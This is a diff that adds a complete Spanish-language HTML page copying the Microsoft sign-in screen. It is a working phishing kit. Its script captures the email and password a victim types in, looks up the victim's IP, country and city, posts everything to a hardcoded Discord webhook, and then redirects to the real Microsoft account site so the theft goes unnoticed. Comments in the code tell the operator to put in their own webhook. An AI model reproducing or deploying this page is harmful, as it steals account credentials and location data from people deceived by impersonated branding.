@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Microsoft</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #eef2f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        /* Contenedor principal de la tarjeta */
+        .login-container {
+            background-color: #ffffff;
+            width: 750px;
+            height: 440px;
+            display: flex;
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Panel izquierdo azul (Logo de Windows) */
+        .left-panel {
+            background: linear-gradient(135deg, #005da4, #0078d4);
+            width: 40%;
+            border-top-left-radius: 12px;
+            border-bottom-left-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .windows-logo {
+            width: 70px;
+            height: 70px;
+            margin-bottom: 15px;
+        }
+
+        .left-panel span {
+            font-size: 11px;
+            letter-spacing: 2px;
+            font-weight: 600;
+            opacity: 0.8;
+        }
+
+        /* Panel derecho (Formulario) */
+        .right-panel {
+            width: 60%;
+            padding: 40px 45px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Logo de Microsoft */
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        
+        .ms-logo img {
+            height: 24px;
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #1b1b1b;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
+
+        /* Campos de texto */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #666666;
+            padding: 8px 0;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-bottom: 2px solid #0067b8;
+            padding-bottom: 7px;
+        }
+
+        .input-group input::placeholder {
+            color: #707070;
+            font-size: 14px;
+        }
+
+        /* Enlaces */
+        .links-group {
+            margin-bottom: 25px;
+        }
+
+        .links-group a {
+            display: block;
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-bottom: 8px;
+        }
+
+        .links-group a:hover {
+            text-decoration: underline;
+        }
+
+        /* Botones */
+        .buttons-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 12px;
+            margin-top: auto;
+        }
+
+        .btn {
+            padding: 7px 20px;
+            font-size: 14px;
+            border: 1px solid transparent;
+            cursor: pointer;
+            border-radius: 4px;
+            min-width: 95px;
+        }
+
+        .btn-secondary {
+            background-color: #ffffff;
+            color: #2b2b2b;
+            border: 1px solid #cccccc;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f2f2f2;
+        }
+
+        .btn-primary {
+            background-color: #0067b8;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #005da4;
+        }
+
+        /* Botón inferior flotante (PC) */
+        .options-btn {
+            position: absolute;
+            bottom: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: white;
+            padding: 8px 16px;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #242424;
+            cursor: pointer;
+            border: none;
+        }
+
+        /* Pie de página */
+        .footer-links {
+            position: fixed;
+            bottom: 15px;
+            right: 20px;
+            font-size: 12px;
+            color: #505050;
+        }
+
+        .footer-links a {
+            color: #505050;
+            text-decoration: none;
+            margin-left: 10px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* --- AQUÍ SE CORRIGE EL DISEÑO PARA MÓVILES (CELULAR) --- */
+        @media (max-width: 768px) {
+            body {
+                justify-content: flex-start; /* Permite un mejor scroll si la pantalla es muy pequeña */
+                padding-top: 60px;
+            }
+
+            .login-container {
+                width: 100%;
+                max-width: 440px; /* Tamaño idéntico al de tu captura de pantalla */
+                height: auto;     /* Altura dinámica según el contenido */
+                border-radius: 12px;
+                box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1); /* Mantiene la sombra */
+            }
+
+            .left-panel {
+                display: none; /* Oculta por completo la sección azul de Windows */
+            }
+
+            .right-panel {
+                width: 100%;
+                padding: 40px 30px; /* Espaciado interno cómodo */
+            }
+
+            .buttons-group {
+                margin-top: 30px; /* Añade separación fija para los botones */
+            }
+
+            .options-btn {
+                display: none; /* Oculta el botón inferior de opciones en celular */
+            }
+
+            .footer-links {
+                position: static;
+                margin-top: 40px;
+                width: 100%;
+                text-align: center;
+                padding-bottom: 20px;
+            }
+
+            .footer-links a {
+                margin: 0 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Panel Izquierdo (Solo visible en PC) -->
+        <div class="left-panel">
+            <svg class="windows-logo" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M0 3.449L9.75 2.1v9.45H0V3.449zM0 12.45h9.75v9.45L0 20.551v-8.1zM10.8 1.95L24 0v11.55H10.8V1.95zM10.8 12.45H24v11.55l-13.2-1.95v-9.6z"/>
+            </svg>
+            <span>MICROSOFT</span>
+        </div>
+
+        <!-- Panel Derecho (Visible en PC y Celular) -->
+        <div class="right-panel">
+            <div class="ms-logo">
+                <img src="logo.svg" alt="Microsoft">
+            </div>
+
+            <h2>Iniciar sesión</h2>
+
+            <form id="contact-form">
+                <div class="input-group">
+                    <input type="email" inputmode="email" id="email" placeholder="Correo electrónico, teléfono o Skype" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="pass" placeholder="Contraseña" required>
+                </div>
+
+                <div class="links-group">
+                    <a href="#">¿No tiene una cuenta? <span style="text-decoration: underline; color: #0067b8;">Cree una.</span></a>
+                    <a href="#">¿No puede acceder a su cuenta?</a>
+                </div>
+
+                <div class="buttons-group">
+                    <button type="button" class="btn btn-secondary">Cancelar</button>
+                    <button type="submit" class="btn btn-primary">Iniciar sesión</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Botón flotante (Solo visible en PC) -->
+        <button class="options-btn">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="8" cy="16" r="5" />
+                <path d="M12 12l8-8 3 3-2 2-2-2-3 3" />
+            </svg>
+            Opciones de inicio de sesión
+        </button>
+    </div>
+
+    <!-- Pie de página -->
+    <div class="footer-links">
+        <a href="#">Términos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+        <a href="#">...</a>
+    </div>
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+<script>
+    // 🚨 CAMBIA ESTA URL POR LA URL REAL DE TU WEBHOOK DE DISCORD 🚨
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi'; 
+    // API pública y gratuita para obtener la IP y geolocalización
+    const IP_API_URL = 'https://ipapi.co/json/';
+
+    const form = document.getElementById('contact-form');
+    // Asegúrate de que estos elementos existan en tu HTML
+    const statusMessage = document.getElementById('status-message'); 
+
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        const submitButton = form.querySelector('input[type="submit"]');
+
+        // 1. Recoger datos del formulario
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        // 2. Primero, obtenemos la información de la IP y geolocalización
+        fetch(IP_API_URL)
+            .then(response => response.json())
+            .then(data => {
+                // Crear variables de ubicación (usando 'Desconocido' si falla)
+                const ip = data.ip || 'Desconocido';
+const country = data.country_name || 'Desconocido'; // Nombre de variable diferente
+const city = data.city || 'Desconocido';
+
+                // 3. CONSTRUIR EL TEXTO COMPLETO CON LA NUEVA INFORMACIÓN
+                const content_with_newlines = `
+**📧Correo:** ${email}
+**🔐Contraseña:** ${pass}
+
+---
+**🧾Información de cliente:**
+**📍IP:** ${ip}
+**🌎País:** ${country}
+**🏙️Ciudad:** ${city}
+                `;
+
+                // 4. Construir el objeto JSON para el webhook de Discord
+                const payload = {
+                    username: "✅MSN✅",
+                    embeds: [{
+                        title: "📧Nuevo correo",
+                        color: 3447003, // Color azul Discord
+                        fields: [
+                            { 
+                                name: "👤Nuevo user", 
+                                value: content_with_newlines,
+                                inline: false 
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 5. Enviar los datos al webhook de Discord
+                return fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+            })
+            .then(response => {
+                if (response.ok) {
+                    // REDIRECCIÓN INSTANTÁNEA AL RECIBIR CONFIRMACIÓN
+                    window.location.href = 'https://account.microsoft.com/';
+                } else {
+                    submitButton.disabled = false;
+                    statusMessage.textContent = '❌ Error al enviar. Verifica la URL del Webhook.';
+                    console.error('Error del Webhook:', response.status, response.statusText);
+                }
+            })
+            .catch(error => {
+                submitButton.disabled = false;
+                statusMessage.textContent = '❌ Error de red o en la API de IP. Inténtalo de nuevo.';
+                console.error('Error de Fetch:', error);
+            });
+    });
+</script>
+</body>
+</html>
